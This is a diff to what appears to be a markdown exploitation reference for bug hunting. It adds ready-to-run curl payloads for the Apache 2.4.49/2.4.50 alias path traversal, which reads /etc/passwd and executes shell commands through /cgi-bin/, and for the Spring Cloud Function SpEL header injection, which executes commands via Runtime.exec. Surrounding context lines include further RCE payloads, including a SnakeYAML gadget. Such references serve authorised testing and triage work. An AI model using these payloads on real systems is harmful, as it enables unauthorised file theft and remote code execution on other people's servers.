@@ -114,6 +114,56 @@ window.location = userControlled  // URL scheme bypass → JS execution
 {{ runscript "id" }}
 ```
 
+### Apache HTTP Server alias path traversal (CVE-2021-41773 / CVE-2021-42013)
+
+Path normalization bug in Apache 2.4.49 (and the 2.4.50 patch-bypass) lets an attacker escape DocumentRoot via dot-encoded segments **through configured alias paths**. The same primitive yields very different impact depending on which alias accepts the traversal:
+
+- Alias without `Options +ExecCGI` (e.g. `/icons/`) → arbitrary file read only
+- Alias with `Options +ExecCGI` (e.g. `/cgi-bin/`) → arbitrary code execution
+
+**Version fingerprint:**
+```bash
+curl -sI http://target/ | grep -i "Server:"
+# Vulnerable: Apache/2.4.49 (CVE-2021-41773) or Apache/2.4.50 (CVE-2021-42013)
+# Patched:    Apache/2.4.51+
+```
+
+**File-read test (any alias):**
+```bash
+curl --path-as-is "http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+# Note: --path-as-is is REQUIRED — curl normalizes %2e by default
+```
+
+**RCE test (cgi-enabled alias only):**
+```bash
+curl --path-as-is -X POST \
+  -d "echo Content-Type: text/plain; echo; id; uname -a; hostname" \
+  "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+```
+
+**Triage discipline note:** when the same path-traversal primitive works on multiple aliases but only one is CGI-enabled, the **maximum** impact is the severity — not the average. A "file read" finding on `/icons/` should always be escalated by re-probing `/cgi-bin/` (and any other alias visible from `<Directory>` blocks in the server-info disclosure or response patterns). See `triage-validation` Pre-Severity Gate.
+
+### Spring Cloud Function SpEL injection (CVE-2022-22963)
+
+Spring Cloud Function ≤ 3.2.2 (and ≤ 3.1.6) evaluates the `spring.cloud.function.routing-expression` header as a SpEL expression on the `/functionRouter` endpoint without auth, before any routing logic. Wide deployment in AWS Lambda + Cloud Run + on-prem function platforms. Often exposed externally because `/functionRouter` auto-registers and devs don't add an explicit gate.
+
+**Detection:**
+- Spring-style port 8080 with `/uppercase`, `/lowercase`, or arbitrary single-word function endpoints responding 200
+- Confirm with `curl -s http://target:8080/uppercase -H "Content-Type: text/plain" --data-binary "test"` → returns `TEST`
+- Version banner via `/actuator/info` or response headers
+
+**Exploit:**
+```bash
+curl -X POST http://target:8080/functionRouter \
+  -H "Content-Type: text/plain" \
+  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})' \
+  --data "x"
+```
+
+The `new String[]{"...", "..."}` array form avoids shell-quoting issues that break the more common `.exec("id")` form when the SpEL header contains parentheses or quotes.
+
+**Generalizes to:** any Spring application that takes user input into a `SpelExpressionParser.parseExpression()` call, especially when delivered via header / query-param routes that bypass normal auth filters. See `hunt-ssti` for the broader SpEL fingerprinting (`*{7*7}` = Spring Thymeleaf).
+
 ### SnakeYAML RCE Gadget
 ```yaml
 !!javax.script.ScriptEngineManager [
